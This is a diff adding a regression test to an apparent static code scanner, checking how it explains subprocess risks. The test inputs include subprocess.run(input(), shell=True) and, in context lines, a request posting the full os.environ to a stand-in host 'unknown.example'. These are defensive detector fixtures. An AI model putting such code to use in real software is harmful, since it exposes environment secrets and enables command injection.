@@ -2,6 +2,16 @@ import unittest
 from main import analyze_code_product
 
 class LaunchRegressions(unittest.TestCase):
+    def test_argument_vector_does_not_claim_shell_metacharacters_are_interpreted(self):
+        for shell in ['', ', shell=False']:
+            result=self.scan('import subprocess\nsubprocess.run(["echo", input()]'+shell+')')
+            finding=next(f for f in result['flags'] if f.get('pattern')=='subprocess' and f.get('severity')==38)
+            self.assertIn('does not interpret shell metacharacters', finding['explanation'])
+            self.assertIn('program may interpret', finding['explanation'])
+        result=self.scan('import subprocess\nsubprocess.run(input(), shell=True)')
+        finding=next(f for f in result['flags'] if f.get('pattern')=='subprocess' and f.get('severity')==38)
+        self.assertIn('when passed through a shell', finding['explanation'])
+
     def test_whole_environment_request_construction_encoding_and_condition(self):
         prefix='import os\nfrom urllib.request import Request, urlopen\nr=Request("https://unknown.example", data=str(dict(os.environ)).encode())\n'
         for suffix,expected in [('',False),('urlopen(r)',True)]:
